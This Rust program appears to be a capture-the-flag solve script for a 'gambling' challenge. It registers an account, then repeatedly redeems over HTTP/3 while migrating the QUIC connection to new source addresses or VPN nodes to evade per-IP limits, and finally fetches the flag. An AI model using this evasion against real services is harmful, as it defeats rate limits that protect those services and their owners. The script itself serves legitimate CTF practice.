use bytes::Bytes;
use clap::Parser;
use http::{HeaderValue, Method};
use rand::distr::Alphanumeric;
use rand::Rng;
use rustls::pki_types::pem::PemObject;
use rustls::pki_types::CertificateDer;
use serde_json::json;
use std::net::{SocketAddr, ToSocketAddrs, UdpSocket};
use std::path::PathBuf;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncWriteExt;

#[derive(clap::Parser, Debug)]
#[command()]
struct Cli {
    /// The port to connect to
    #[arg(short, long, default_value_t = 443)]
    port: u16,

    /// The DNS name of the server to connect to
    #[arg(short, long, default_value = "gambling.challs.umdctf.io")]
    server_name: String,

    /// Path to a self-signed / custom certificate, if necessary
    #[arg(long)]
    cert: Option<PathBuf>,

    /// When testing on localhost, instead of using a VPN, enable to rebind to a different loopback address
    #[arg(long, default_value_t = false)]
    loopback: bool,
}

#[tokio::main]
async fn main() {
    let args = Cli::parse();

    rustls::crypto::aws_lc_rs::default_provider()
        .install_default()
        .unwrap();
    let mut root_store = rustls::RootCertStore {
        roots: webpki_roots::TLS_SERVER_ROOTS.into(),
    };

    if let Some(cert_path) = args.cert {
        let certs: Vec<_> = CertificateDer::pem_file_iter(&cert_path)
            .unwrap_or_else(|e| panic!("Failed to load {:?}: {:?}", cert_path, e))
            .map(|result| {
                result.unwrap_or_else(|e| panic!("Failed to load {:?}: {:?}", cert_path, e))
            })
            .collect();
        root_store.add_parsable_certificates(certs);
    }

    let mut crypto = rustls::ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();
    crypto.alpn_protocols = vec![b"h3".to_vec()];
    let endpoint = quinn::Endpoint::client(SocketAddr::from_str(if args.loopback { "127.0.0.1:0" } else { "[::]:0" }).unwrap()).unwrap();
    let quic_config = quinn::crypto::rustls::QuicClientConfig::try_from(crypto).unwrap();
    let quinn_config = quinn::ClientConfig::new(Arc::new(quic_config));
    let socket_addr = (args.server_name.as_ref(), args.port)
        .to_socket_addrs()
        .expect("Failed to resolve server address")
        .next()
        .expect("No matching server addresses");
    let quic_conn = endpoint
        .connect_with(quinn_config, socket_addr, &args.server_name)
        .unwrap()
        .await
        .unwrap();
    let (mut driver, mut send_request) = h3::client::new(h3_quinn::Connection::new(quic_conn))
        .await
        .unwrap();

    let drive = async move {
        std::future::poll_fn(|cx| driver.poll_close(cx)).await?;
        Ok::<(), Box<dyn std::error::Error>>(())
    };

    let base_uri = if args.port == 443 {
        format!("https://{}", args.server_name)
    } else {
        format!("https://{}:{}", args.server_name, args.port)
    };

    let rand_string: String = rand::rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();
    let request = {
        let endpoint = endpoint.clone();
        async move {
            let register_request = http::Request::builder()
                .uri(format!("{}/register", base_uri))
                .method(Method::POST)
                .header(http::header::CONTENT_TYPE, "application/json")
                .body(())
                .unwrap();
            let mut stream = send_request.send_request(register_request).await.unwrap();
            let authorization =
                Bytes::from(json!({"username": rand_string, "password": rand_string}).to_string());
            stream.send_data(authorization.clone()).await.unwrap();
            stream.finish().await.unwrap();
            stream.recv_response().await.unwrap();
            while let Some(_) = stream.recv_data().await.unwrap() {}

            for i in 1..4 {
                let redeem_request = http::Request::builder()
                    .uri(format!("{}/redeem", base_uri))
                    .method(Method::POST)
                    .header(
                        http::header::AUTHORIZATION,
                        HeaderValue::from_bytes(authorization.as_ref()).unwrap(),
                    )
                    .header(http::header::CONTENT_TYPE, "application/json")
                    .body(())
                    .unwrap();
                let mut stream = send_request.send_request(redeem_request).await.unwrap();

                let payload = Bytes::from(json!("eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/").to_string());
                stream.send_data(payload).await.unwrap();

                if i != 1 {
                    if args.loopback {
                        endpoint
                            .rebind(
                                UdpSocket::bind((format!("127.0.0.{}", i), 0))
                                    .expect("Failed to bind socket"),
                            )
                            .expect("Failed to rebind QUIC endpoint");
                        tokio::time::sleep(Duration::from_secs(3)).await;
                    } else {
                        println!("CONNECT TO NEW VPN NODE");
                        tokio::time::sleep(Duration::from_secs(10)).await;
                    }
                }

                stream.finish().await.unwrap();
                let response = stream.recv_response().await.unwrap();
                while let Some(_) = stream.recv_data().await.unwrap() {}

                println!("{:?}", response.status());

                if i != 1 {
                    if args.loopback {
                        endpoint
                            .rebind(
                                UdpSocket::bind(("127.0.0.1", 0)).expect("Failed to bind socket"),
                            )
                            .expect("Failed to rebind QUIC endpoint");
                        tokio::time::sleep(Duration::from_secs(3)).await;
                    } else {
                        println!("DISCONNECT FROM VPN NODE");
                        tokio::time::sleep(Duration::from_secs(10)).await;
                    }
                }
            }

            let flag_request = http::Request::builder()
                .uri(format!("{}/flag", base_uri))
                .method(Method::POST)
                .header(
                    http::header::AUTHORIZATION,
                    HeaderValue::from_bytes(authorization.as_ref()).unwrap(),
                )
                .body(())
                .unwrap();
            let mut stream = send_request.send_request(flag_request).await.unwrap();
            stream.finish().await.unwrap();
            stream.recv_response().await.unwrap();
            while let Some(mut chunk) = stream.recv_data().await.unwrap() {
                let mut out = tokio::io::stdout();
                out.write_all_buf(&mut chunk).await.unwrap();
                out.flush().await.unwrap();
            }
        }
    };

    let _ = tokio::join!(drive, request);
    endpoint.wait_idle().await;
}
